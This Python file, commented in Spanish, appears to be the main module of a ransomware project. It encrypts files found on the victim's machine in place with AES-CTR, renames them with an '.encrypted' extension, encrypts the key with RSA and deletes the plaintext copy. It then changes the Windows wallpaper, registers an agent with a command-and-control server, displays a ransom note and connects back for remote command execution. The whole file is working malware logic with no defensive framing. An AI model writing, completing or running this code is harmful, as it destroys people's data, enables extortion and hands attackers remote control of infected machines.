import os
import ctypes
import multiprocessing
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from find_files import find_files
import gen_keys
import agent
import ransom_note

def load_aes_key():
    ruta_clave = os.path.abspath("aes_key.bin")
    with open(ruta_clave, "rb") as clave_file:
        return clave_file.read()

def encrypt_aes_key(aes_key):
    gen_keys.generate_rsa_key()
    with open("rsa_public.pem", "rb") as f:
        rsa_public_key = RSA.import_key(f.read())
    cipher_rsa = PKCS1_OAEP.new(rsa_public_key)
    aes_key_encrypted = cipher_rsa.encrypt(aes_key)
    with open("aes_key_encrypted.bin", "wb") as f:
        f.write(aes_key_encrypted)

def encrypt_file(file, aes_key):
    # Cifra un archivo usando la clave AES y el modo de cifrado CTR 
    try:
        nonce = os.urandom(12)  # Genera un nonce aleatorio de 12 bytes
        cipher = AES.new(aes_key, AES.MODE_CTR, nonce=nonce)  # Inicializa el cifrador AES en modo CTR
        with open(file, "rb") as f:
            data = f.read()  # Lee los datos del archivo
        encrypted_data = cipher.encrypt(data)  # Cifra los datos del archivo
        with open(file, "wb") as f:
            f.write(nonce + encrypted_data)  # Guarda el nonce seguido de los datos cifrados
        encrypted_file = file + ".encrypted"  # Renombra el archivo con la extensión ".encrypted"
        os.rename(file, encrypted_file)  # Renombra el archivo original
        print(f"Archivo cifrado: {file} -> {encrypted_file}")
    except Exception as e:
        print(f"Error cifrando {file}: {e}") 

def encrypt_files():
    gen_keys.generate_aes_key()  # Generar clave simétrica
    aes_key = load_aes_key()  # Cargar la clave simétrica
    files = find_files()  # Obtener lista de archivos a cifrar
    with multiprocessing.Pool(processes=os.cpu_count()) as pool:
        # Usa un pool de procesos para cifrar los archivos en paralelo
        pool.starmap(encrypt_file, [(file, aes_key) for file in files]) 
    print("Archivos cifrados correctamente.")
    encrypt_aes_key(aes_key)  # Se cifra la clave AES con la clave pública RSA
    os.remove("aes_key.bin")  # Eliminar clave simétrica sin cifrar
    os.remove("rsa_public.pem")  # Eliminar clave pública RSA
    change_background() # Cambiar fondo de pantalla
    agent.register_agent()  # Registrar agente en C2
    ransom_note.show_ransom_note() # Mostrar nota de rescate personalizada en escritorio
    agent.connect_to_c2_server() # Conexión con servidor C2 para ejecución remota de comandos

def change_background():
    image_path = os.path.abspath("background_image/background.png")
    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3) # Llama a la API de Windows para cambiar el fondo
